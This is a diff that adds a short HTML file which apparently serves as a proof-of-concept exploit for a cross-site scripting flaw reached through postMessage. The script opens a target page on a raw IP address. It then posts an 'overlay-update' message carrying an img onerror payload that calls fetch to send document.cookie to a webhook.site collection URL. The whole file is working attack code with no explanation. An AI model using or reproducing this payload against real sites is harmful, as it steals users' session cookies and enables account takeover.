@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html><body><script>
+var w = window.open('http://35.187.236.150:3000/video.html?v=1');
+setTimeout(() => {
+  w.postMessage({
+    type: 'overlay-update',
+    content: '<img src=x/onerror=fetch(`https://webhook.site/1875238c-b451-44dd-baf0-0560d8c4f3e4?x=`+document.cookie)>'
+  }, '*');
+}, 2000);
+</script></body></html>
